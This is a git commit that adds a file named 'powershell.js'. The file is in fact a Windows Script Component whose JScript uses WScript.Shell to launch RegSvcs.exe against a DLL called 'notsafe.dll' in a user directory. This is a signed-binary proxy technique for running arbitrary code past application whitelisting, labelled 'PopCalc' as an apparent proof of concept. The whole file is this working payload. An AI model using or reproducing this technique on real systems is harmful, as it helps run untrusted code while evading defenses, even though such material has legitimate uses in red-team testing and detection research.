f7f80e4647dfd8fde5bac16fc5e822076d1add33
ment4t <ment4t@users.noreply.github.com>
2020-10-07 16:37:00 +0100

    Create powershell.js

---
+++ powershell.js
@@ -0,0 +1,10 @@
+<?xml version="1.0"?>
+<package>
+<component id="PopCalc">
+<script language="JScript">
+<![CDATA[
+var r = new ActiveXObject("WScript.Shell").Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\RegSvcs.exe C:\Users\durysg\notsafe.dll"); 
+]]>
+</script>
+</component>
+</package>
